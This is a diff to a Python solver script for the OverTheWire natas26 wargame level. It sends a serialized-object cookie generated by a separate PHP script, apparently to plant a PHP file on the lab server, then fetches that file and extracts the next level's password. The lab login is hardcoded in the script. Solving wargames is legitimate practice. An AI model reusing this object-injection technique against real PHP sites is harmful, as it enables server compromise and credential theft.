@@ -9,14 +9,12 @@ pass_reg = '[a-zA-Z0-9]{32}'
 
 def solve():
     auth = HTTPBasicAuth('natas26','oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')
-    cook = {'drawing':subprocess.run(['php', 'natas26.php'], stdout=subprocess.PIPE).stdout.decode('utf-8'), 'PHPSESSID':'tald'}
-    param = {'x1':'0','y1':'0','x2':'0','y2':'0'}
-    r = requests.get('http://natas26.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)   
+    cook = {'drawing':subprocess.run(['php', 'natas26serializestring.php'], stdout=subprocess.PIPE).stdout.decode('utf-8'), 'PHPSESSID':'tald'}
+    r = requests.get('http://natas26.natas.labs.overthewire.org/', auth=auth, cookies=cook)   
     url = r.text.find
-    r = requests.get('http://natas26.natas.labs.overthewire.org/img/natas26_tald.png', auth=auth, cookies=cook, params=param)   
+    r = requests.get('http://natas26.natas.labs.overthewire.org/img/natas26_tald.php', auth=auth, cookies=cook)    
     
-#   print(re.findall(pass_reg, r.text))
-    print(r.text)
+    print(re.findall(pass_reg, r.text)[0])
 if __name__ == '__main__':
     solve()
     
